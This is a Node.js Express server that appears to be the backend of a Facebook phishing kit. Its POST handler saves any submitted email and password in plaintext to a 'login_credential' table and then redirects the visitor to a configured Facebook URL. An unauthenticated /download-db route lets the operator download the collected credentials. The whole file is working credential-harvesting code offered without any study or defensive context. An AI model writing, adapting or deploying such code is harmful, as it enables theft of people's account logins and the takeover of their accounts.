const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const path = require("path");

const PORT = process.env.PORT || 3000
// const downloadLink = require("./routes/download");

//Importing the database into the server
const db = require("./databaseSetup");

//serving static files
app.use(express.static("public"));
app.use(express.json());
// app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// importing the dotenv file
require("dotenv").config();

//middlewire for the ejs app
app.set("view engine", "ejs");

app.get("/", (req, res) => {
  res.render("login-page");
});

app.get("/recover-account", (req, res) => {
  res.render("recover");
});

app.post("/", (req, res) => {
  const { email, password } = req.body;

  try {
    //checking if the email exists in the database
    db.get(
      "SELECT * FROM login_credential WHERE email=?",
      [email],
      function (err, result) {
        if (err) return console.log(err.message);

        if (result) {
          console.log(result);
          res.redirect(process.env.FACEBOOK_URL);
        } else {
          // create the user and insert their result in the database
          db.run(
            `INSERT INTO login_credential (email, password)
            VALUES(?, ?)`,
            [email, password],
            (err, result) => {
              if (err) return err.message;

              console.log("User has successfully been created.");
              res.redirect(process.env.FACEBOOK_URL);
            }
          );
        }
      }
    );
  } catch (error) {
    console.error("error");
  }
});

// Download route to
app.get("/download-db", (req, res) => {
  const filePath = path.join(__dirname, "/"+`${process.env.DATABASE_NAME}`);
  console.log(__dirname);

  res.download(filePath, `${process.env.DATABASE_NAME}`, (err) => {
    // if (err) res.render("login-page", { error: "no such file or directory found" });
  });
  
});

app.listen(
  process.env.PORT,
  console.log(`server is listening on http://localhost:${PORT}`)
);
